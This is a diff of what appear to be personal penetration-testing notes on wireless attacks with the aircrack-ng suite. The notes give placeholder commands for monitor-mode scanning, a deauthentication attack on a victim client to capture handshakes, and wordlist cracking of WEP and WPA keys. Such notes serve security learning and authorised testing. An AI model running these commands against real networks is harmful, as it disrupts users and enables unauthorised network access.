@@ -1,27 +1,63 @@
-# Wireless
+---
+icon: screwdriver-wrench
+---
 
-### airodump-ng
+# Tools
 
-**Scanning**
+## airodump-ng
 
-* adapter must be in monitor mode
-  * `ifconfig wlan0 down`
-  * sometimes need `airodump-ng check kill`
-  * `iwconfig mode monitor`
-  * `ifconfig wlan0 up`
+### **Scanning**
+
+Adapter must be in monitor mode
+
+```bash
+ifconfig wlan0 down
+```
+
+```bash
+airodump-ng check kill
+iwconfig mode monitor
+ifconfig wlan0 up
+```
+
 * to sniff 5g, use `--band abg` (or whatever specific band you are looking for)
-* `airodump-ng --band abg mon0` (mon0 is new interface name for monitor mode adapter)
-* \--bssid \[BSSID]
-* \--channel \[channel]
-* \--write \[filename]
 
-**Deauthentication**
+```bash
+# Get new interface
+iwconfig
+airodump-ng --band abg [iface]
+```
 
-* disconnect a client from the networks
-* `aireplay-ng --deauth [# of packets (large if you want to just dc)] -a [ap mac address] -c [victim mac address] mon0`
-* airodump-ng may need to be running at the time the command is executed
+Get information of the network we are trying to crack
 
-**WEP**
+* BSSID
+* Channel
+
+{% code overflow="wrap" %}
+```bash
+airodump-ng --band abg --bssid [BSSID] -c [channel] -w [outfile] [iface]
+```
+{% endcode %}
+
+### **Deauth Attack**
+
+Disconnect a client from the networks (with scan running)
+
+{% code overflow="wrap" %}
+```bash
+aireplay-ng -0 1 -a [AP mac address] -c [victim mac address] [iface]
+```
+{% endcode %}
+
+* May need to run the deauth attack many times to get handshake, would be best to attempt against various targets
+
+### Crack the capture file
+
+```bash
+aircrack-ng [filename].cap -w [wordlist]
+```
+
+### **WEP**
 
 * run a specific airodump scan
 * Need a high number of Data packets (IVs) to easily crack the key. Busier networks mean more data packets
@@ -34,7 +70,7 @@
 * `aircrack-ng [filename].cap`
 * can use ascii or key with colons removed to connect to network
 
-**WPA/WPA2**
+### **WPA/WPA2**
 
 * _**WPS**_
   * discover WPS enabled devices
